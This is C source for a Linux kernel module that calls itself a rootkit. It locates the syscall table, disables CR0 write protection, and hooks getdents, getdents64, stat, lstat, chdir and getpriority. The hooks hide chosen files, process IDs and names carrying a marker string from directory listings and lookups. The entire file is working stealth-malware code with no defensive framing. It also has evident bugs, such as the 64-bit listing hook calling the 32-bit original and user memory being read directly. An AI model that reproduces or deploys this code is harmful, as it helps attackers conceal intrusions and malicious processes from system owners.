#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h> // __NR_syscall
#include <linux/version.h> // LINUX_VERSION_CODE
#include <linux/string.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/types.h>
#include <asm/paravirt.h> // write_cr0
#include <linux/slab.h>		// kmalloc()
#include <linux/syscalls.h> //__MAP, __SC_DECL

#include "hooks.h"
#include "config.h"

#define ENABLE_WRITE() write_cr0(read_cr0() & (~(1<<16)));
#define DISABLE_WRITE() write_cr0(read_cr0() | (1<<16));

struct list_head list_files = LIST_HEAD_INIT(list_files);
struct list_head list_pids = LIST_HEAD_INIT(list_pids);

struct linux_dirent {
	unsigned long   d_ino;
	unsigned long   d_off;
	unsigned short  d_reclen; // d_reclen is the way to tell the length of this entry
	char            d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
};

typedef unsigned long long ino64_t;
typedef unsigned long long off64_t;
struct linux_dirent64 {
	ino64_t         d_ino;
	off64_t         d_off;
	unsigned short  d_reclen; // d_reclen is the way to tell the length of this entry
	char            padding; // I don't know why but without this d_name includes one extra byte
	                         // at the beggining that doesn't belong to the name
	char            d_name[1]; // the struct value is actually longer than this, and d_name is variable width.
};

unsigned long *syscall_table = NULL;

// HOOK DEFINING MACROS ---------------------------------------------
//similar to how kernel defines syscalls using SYSCALL_DEFINEx
#if LINUX_VERSION_CODE >= KERNEL_VERSION(4, 17, 0) //pt_regs struct for args, kernel >= 4.17
//similar to how kernel defines __MAP in syscalls.h
#define args1 regs->di
#define args2 args1, regs->si
#define args3 args2, regs->dx
#define args4 args3, regs->r10
#define args5 args4, regs->r8
#define args6 args5, regs->r9
#define args(n) args##n
#define DECL_DO_HOOK(n_args, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__), const struct pt_regs* regs
#define DECL_ORIG_HOOK(n_args, ...) const struct pt_regs* regs
#define ARGS_ORIG(n_args, ...) regs
#define ARGS_DO_HOOK(n_args, ...) args(n_args), regs

#else //normal args, kernel < 4.17
#define DECL_DO_HOOK(n_args, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__), const struct pt_regs* regs
#define DECL_ORIG_HOOK(n_args, ...) __MAP(n_args, __SC_DECL, __VA_ARGS__)
#define ARGS_ORIG(n_args, ...) __MAP(n_args, __SC_ARGS, __VA_ARGS__)
#define ARGS_DO_HOOK(n_args, ...) ARGS_ORIG(n_args, __VA_ARGS__), NULL //regs is null, as these kernel versions do not use it
#endif

#define hook_define(n_args, ret_type, syscall_name, ...)                                               \
	asmlinkage ret_type sys_##syscall_name##_do_hook(DECL_DO_HOOK(n_args, __VA_ARGS__));               \
	asmlinkage ret_type (*sys_##syscall_name##_orig)(DECL_ORIG_HOOK(n_args, __VA_ARGS__));             \
	asmlinkage ret_type sys_##syscall_name##_hook(DECL_ORIG_HOOK(n_args, __VA_ARGS__)){                \
		return sys_##syscall_name##_do_hook(ARGS_DO_HOOK(n_args, __VA_ARGS__));                        \
	}

#define hook_define_ret(n_args, ret_type, syscall_name, ...)                                           \
	asmlinkage ret_type sys_##syscall_name##_do_hook(DECL_DO_HOOK_RET(n_args, ret_type, __VA_ARGS__)); \
	asmlinkage ret_type (*sys_##syscall_name##_orig)(DECL_ORIG_HOOK(n_args, __VA_ARGS__));             \
	asmlinkage ret_type sys_##syscall_name##_hook(DECL_ORIG_HOOK(n_args, __VA_ARGS__)){                \
		ret_type ret = sys_##syscall_name##_orig(ARGS_ORIG(n_args, __VA_ARGS__));                      \
		return sys_##syscall_name##_do_hook(ARGS_DO_HOOK_RET(n_args, __VA_ARGS__));                    \
	}

// END HOOK DEFINING MACROS -----------------------------------------

hook_define(3, long, getdents, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count);
hook_define(3, long, getdents64, unsigned int, fd, struct linux_dirent64 __user*, dirent, unsigned int, count);
hook_define(2, long, stat, const char __user*, pathname, struct __old_kernel_stat __user*, statbuf);
hook_define(2, long, lstat, const char __user*, pathname, struct __old_kernel_stat __user*, statbuf);
hook_define(1, long, chdir, const char __user*, pathname);
hook_define(2, long, getpriority, int, which, int, who);

asmlinkage long sys_getdents_do_hook(unsigned int fd, struct linux_dirent __user* dirent, unsigned int count, const struct pt_regs* regs) {
	int buff_offset, deleted_size;
	struct linux_dirent* currnt;
	struct list_files_node* node_file;
	struct list_pids_node* node_pid;
	bool del;
	char pid_str[8];
	long ret;

	ret = sys_getdents_orig(ARGS_ORIG(3, unsigned int, fd, struct linux_dirent __user*, dirent, unsigned int, count));

	buff_offset = 0;
	while (buff_offset < ret){
		currnt = (struct linux_dirent*)((char*)dirent + buff_offset);
		del = false;
		if (strstr(currnt->d_name, HIDE_STR) != NULL)
			del = true;

		list_for_each_entry(node_file, &list_files, list){
			if (strcmp(currnt->d_name, node_file->name) == 0){
				del = true;
				break;
			}
		}
		list_for_each_entry(node_pid, &list_pids, list){
			snprintf(pid_str, sizeof(pid_str), "%d", node_pid->pid);
			if (strcmp(currnt->d_name, pid_str) == 0){
				del = true;
				break;
			}
		}

		if (del){
			//printk(KERN_INFO "ROOTKIT: sysgetdents trying to hide %s\n", currnt->d_name);
			// Copies the rest of the buffer to the position of the current entry
			deleted_size = currnt->d_reclen;
			memcpy(currnt, (char*)currnt + currnt->d_reclen,  ret - buff_offset - currnt->d_reclen);
			ret -= deleted_size;
		} else
			buff_offset += currnt->d_reclen;

	}
	//printk(KERN_INFO "ROOTKIT: sysgetdents finish\n");
	return ret;
}

// COPY PASTE: YOU CAN DO IT BETTER B****
asmlinkage long sys_getdents64_do_hook(unsigned int fd, struct linux_dirent64 __user* dirent, unsigned int count, const struct pt_regs* regs) {
	int buff_offset, deleted_size;
	struct linux_dirent64* currnt;
	struct list_files_node* node_file;
	struct list_pids_node* node_pid;
	bool del;
	char pid_str[8];
	long ret;

	ret = sys_getdents_orig(ARGS_ORIG(3, unsigned int, fd, struct linux_dirent64 __user*, dirent, unsigned int, count));

	buff_offset = 0;
	while (buff_offset < ret){
		currnt = (struct linux_dirent64*)((char*)dirent + buff_offset);
		del = false;
		if (strstr(currnt->d_name, HIDE_STR) != NULL)
			del = true;

		list_for_each_entry(node_file, &list_files, list){
			if (strcmp(currnt->d_name, node_file->name) == 0){
				del = true;
				break;
			}
		}
		list_for_each_entry(node_pid, &list_pids, list){
			snprintf(pid_str, sizeof(pid_str), "%d", node_pid->pid);
			if (strcmp(currnt->d_name, pid_str) == 0){
				del = true;
				break;
			}
		}

		if (del){
			//printk(KERN_INFO "ROOTKIT: sysgetdents trying to hide %s\n", currnt->d_name);
			// Copies the rest of the buffer to the position of the current entry
			deleted_size = currnt->d_reclen;
			memcpy(currnt, (char*)currnt + currnt->d_reclen,  ret - buff_offset - currnt->d_reclen);
			ret -= deleted_size;
		} else
			buff_offset += currnt->d_reclen;

	}
	//printk(KERN_INFO "ROOTKIT: sysgetdents finish\n");
	return ret;
}

const char* my_basename(const char __user* pathname){
	// proc/ /proc proc proc/pepe /proc/ TESTING
	int len = strlen(pathname);
	const char __user* basename = pathname;
	for (int i = 0; i < len-1; i++)
		if (pathname[i] == '/')
			basename = pathname+i+1;

	len = strlen(basename);
	char* result = kmalloc(len+1, GFP_KERNEL);
	memcpy(result, basename, len+1);
	if (result[len-1] == '/') //delete / on last character
		result[len-1] = '\x00';

	return result;

	/*
	char* tmp = kmalloc(len+1, GFP_KERNEL);
	memcpy(tmp, pathname, len+1);
	char* last_barra = strrchr(tmp, '/');
	if (last_barra == NULL)
		return tmp;
	if (last_barra == tmp+len-1){ //last pos
		tmp[len-1] = '\x00';
		last_barra = strrchr(tmp, '/');
		if (last_barra == NULL)
			return tmp;
	}
	return last_barra+1;*/
}

int check_pids_in_pathname(const char __user *pathname, const char* syscall_caller){
	struct list_pids_node* node;
	char pid_str[8];
	const char* filename;
	list_for_each_entry(node, &list_pids, list){
		snprintf(pid_str, sizeof(pid_str), "%d", node->pid);
		filename = my_basename(pathname);
		if (strcmp(pid_str, filename) == 0){
			kfree(filename);
			printk(KERN_INFO "ROOTKIT: Hidden process %s from call to %s\n", pid_str, syscall_caller);
			return -1;
		}
		kfree(filename);
	}
	return 0;
}

asmlinkage long sys_stat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, const struct pt_regs* regs){
	if (check_pids_in_pathname(pathname, "stat") == -1) return -ENOENT;
	return sys_stat_orig(ARGS_ORIG(2, const char __user *, pathname, struct __old_kernel_stat __user*, statbuf));
}

asmlinkage long sys_lstat_do_hook(const char __user *pathname, struct __old_kernel_stat __user *statbuf, const struct pt_regs* regs){
	//printk(KERN_INFO "ROOTKIT: hello from stat\n");
	if (check_pids_in_pathname(pathname, "lstat") == -1) return -ENOENT;
	return sys_lstat_orig(ARGS_ORIG(2, const char __user *, pathname, struct __old_kernel_stat __user*, statbuf));
}

asmlinkage long sys_chdir_do_hook(const char __user *pathname, const struct pt_regs* regs){
	if (check_pids_in_pathname(pathname, "chdir") == -1) return -ENOENT;
	return sys_chdir_orig(ARGS_ORIG(1, const char __user*, pathname));
}

asmlinkage long sys_getpriority_do_hook(int which, int who, const struct pt_regs* regs){
	struct list_pids_node* node;
	if (which == PRIO_PROCESS){
		list_for_each_entry(node, &list_pids, list){
			if (node->pid == who){
				printk(KERN_INFO "ROOTKIT: Hidden process %d from call to getpriority\n", who);
				return -ENOENT;
			}
		}
	}
	return sys_getpriority_orig(ARGS_ORIG(2, int, which, int, who));
}

//__init para que solo lo haga una vez y después pueda sacarlo de memoria
int __init hooks_init(void){
	if ((syscall_table = (void *)kallsyms_lookup_name("sys_call_table")) == 0){
		printk(KERN_ERR "ROOTKIT ERROR: Syscall table not found!");
		return -1;
	}
	printk(KERN_INFO "ROOTKIT: Syscall table found at %lx\n", (long unsigned int)syscall_table);
	printk(KERN_INFO "ROOTKIT: Starting hooks\n");

	sys_getdents_orig = (void*)syscall_table[__NR_getdents];
	sys_getdents64_orig = (void*)syscall_table[__NR_getdents64];
	sys_stat_orig = (void*)syscall_table[__NR_stat];
	sys_lstat_orig = (void*)syscall_table[__NR_lstat];
	sys_chdir_orig = (void*)syscall_table[__NR_chdir];
	sys_getpriority_orig = (void*)syscall_table[__NR_getpriority];

	ENABLE_WRITE();
	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_hook;
	if (HOOK_GETDENTS64) syscall_table[__NR_getdents64] = sys_getdents64_hook;
	if (HOOK_STAT) syscall_table[__NR_stat] = sys_stat_hook;
	if (HOOK_LSTAT) syscall_table[__NR_lstat] = sys_lstat_hook;
	if (HOOK_CHDIR) syscall_table[__NR_chdir] = sys_chdir_hook;
	if (HOOK_GETPRIORITY) syscall_table[__NR_getpriority] = sys_getpriority_hook;
	DISABLE_WRITE();

	printk(KERN_INFO "ROOTKIT: Finished hooks\n");
	return 0;
}


void __exit hooks_exit(void){
	ENABLE_WRITE();
	if (HOOK_GETDENTS) syscall_table[__NR_getdents] = sys_getdents_orig;
	if (HOOK_GETDENTS64) syscall_table[__NR_getdents64] = sys_getdents64_orig;
	if (HOOK_STAT) syscall_table[__NR_stat] = sys_stat_orig;
	if (HOOK_LSTAT) syscall_table[__NR_lstat] = sys_lstat_orig;
	if (HOOK_CHDIR) syscall_table[__NR_chdir] = sys_chdir_orig;
	if (HOOK_GETPRIORITY) syscall_table[__NR_getpriority] = sys_getpriority_orig;
	DISABLE_WRITE();

	// delete lists
	struct list_files_node *node_file, *tmp_file;
	struct list_pids_node *node_pid, *tmp_pid;
	list_for_each_entry_safe(node_file, tmp_file, &list_files, list){
		list_del(&node_file->list);
		kfree(node_file->name);
		kfree(node_file);
	}
	list_for_each_entry_safe(node_pid, tmp_pid, &list_pids, list){
		list_del(&node_pid->list);
		kfree(node_pid);
	}
}

// HIDE THOSE FKING FILES
int hide_file(const char* name){
	struct list_files_node* node = kmalloc(sizeof(struct list_files_node), GFP_KERNEL);
	if (node == NULL){
		printk(KERN_INFO "ROOTKIT: ERROR allocating node for hiding file %s\n", name);
		return -1;
	}

	node->name = kmalloc(strlen(name)+1, GFP_KERNEL);
	if (node->name == NULL){
		printk(KERN_INFO "ROOTKIT: ERROR allocating node name for hiding file %s\n", name);
		kfree(node);
		return -1;
	}

	strcpy(node->name, name);
	list_add(&node->list, &list_files);
	printk(KERN_INFO "ROOTKIT: Hidden file %s\n", name);
	return 0;
}

int unhide_file(const char* name){
	struct list_files_node *node, *tmp;
	list_for_each_entry_safe(node, tmp, &list_files, list){
		if (strcmp(node->name, name) == 0){
			list_del(&node->list);
			kfree(node->name);
			kfree(node);
			printk(KERN_INFO "ROOTKIT: Unhidden file %s\n", name);
			return 0;
		}
	}
	printk(KERN_INFO "ROOTKIT: ERROR trying to unhide not found file %s\n", name);
	return -1;
}

// HIDE THOSE FKING PIDS
int hide_pid(int pid){
	struct list_pids_node* node = kmalloc(sizeof(struct list_pids_node), GFP_KERNEL);
	if (node == NULL){
		printk(KERN_INFO "ROOTKIT: ERROR allocating node for hiding pid %d\n", pid);
		return -1;
	}

	node->pid = pid;
	list_add(&node->list, &list_pids);
	printk(KERN_INFO "ROOTKIT: Hidden PID %d\n", pid);
	return 0;
	/*char pid_s[8]; //PID_MAX_LIMIT can be up to 2^22 = 4194304
	if (pid > PID_MAX_LIMIT){
		printk(KERN_INFO "ROOTKIT: ERROR hiding pid %d larger than PID_MAX_LIMIT\n", pid);
		return -1;
	}
	snprintf(pid_s, sizeof(pid_s), "%d", pid);
	return hide_file(pid_s);*/
}

int unhide_pid(int pid){
	struct list_pids_node *node, *tmp;
	list_for_each_entry_safe(node, tmp, &list_pids, list){
		if (node->pid == pid){
			list_del(&node->list);
			printk(KERN_INFO "ROOTKIT: Unhidden PID %d\n", pid);
			return 0;
		}
	}
	printk(KERN_INFO "ROOTKIT: ERROR trying to unhide not found pid %d\n", pid);
	return -1;
	/*char pid_s[8];
	snprintf(pid_s, sizeof(pid_s), "%d", pid);
	return unhide_file(pid_s);*/
}
